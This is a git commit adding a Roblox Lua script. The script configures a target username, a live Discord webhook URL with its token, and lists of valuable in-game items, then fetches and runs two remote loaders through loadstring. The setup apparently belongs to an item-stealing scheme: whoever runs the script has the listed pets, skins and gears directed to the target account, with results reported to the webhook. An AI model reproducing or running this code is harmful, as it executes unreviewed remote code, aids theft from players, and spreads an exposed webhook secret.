872449800f813b0e368ab69030fbf7b97495f73c
sab-api <carlosignaa2019@gmail.com>
2026-09-22 20:41:57 -0300

    Add script ZL_1790120517482.lua

---
+++ scripts/ZL_1790120517482.lua
@@ -0,0 +1,65 @@
+-- Mode: CUSTOM
+getgenv().TARGET_USERNAME = "sebas1423m"
+getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1544120942073225397/jEcz9n55Xp6F9DPmtgIuOmr1PianlwEYNn4fAV1JqU3ypfG1Nyga6u1h4OVoC-5mHB_m"
+getgenv().NORMAL_BRAINROTS = {
+    ["Headless Horseman"] = true,
+    ["Meowl"] = true,
+    ["Strawberry Elephant"] = true,
+    ["Skibidi Toilet"] = true,
+    ["John Pork"] = true,
+    ["Spyder Elephant"] = true,
+    ["Garama and Madundung"] = true,
+    ["Arcadragon"] = true,
+    ["Cuadramat and Pakrahmatmamat"] = true,
+    ["Dragon Aquanini"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["Hydra Bunny"] = true,
+    ["Dragon Gingerini"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+    ["Torrtuginni Dragonfrutini"] = true,
+    ["Capitano Moby"] = true,
+    ["Cash or Card"] = true,
+    ["Celestial Pegasus"] = true,
+    ["Caylusaurus"] = true,
+    ["Cerberus"] = true,
+    ["Coco and Mango"] = true,
+    ["Cooki and Milki"] = true,
+    ["Elefanto Frigo"] = true,
+    ["Eviledon"] = true,
+    ["Foxini Lanternini"] = true,
+    ["Fragola La La La"] = true,
+    ["Jelly Moby"] = true,
+    ["Kalika Bros"] = true
+}
+getgenv().NORMAL_BASE_SKINS = {
+    ["Rose"] = true,
+    ["Gingerbread"] = true,
+    ["Halloween"] = true,
+    ["Christmas"] = true,
+    ["Bunny Basket"] = true,
+    ["Summer"] = true,
+    ["Pot of Gold"] = true,
+    ["Taco"] = true,
+    ["Octo"] = true,
+    ["Valentines"] = true,
+    ["Easter"] = true,
+    ["Lucky"] = true,
+    ["Aquatic"] = true,
+    ["Tralalero"] = true,
+    ["Bee Emperor"] = true,
+    ["Honey Bee"] = true
+}
+getgenv().NORMAL_GEARS = {
+    ["Waverider"] = true,
+    ["Witch's Broom"] = true,
+    ["Santa's Sleigh"] = true,
+    ["Cupid's Wings"] = true
+}
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
+end)
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/xspeedHub0/Zlhub/main/ZLPVPreview.lua"))()
+end)
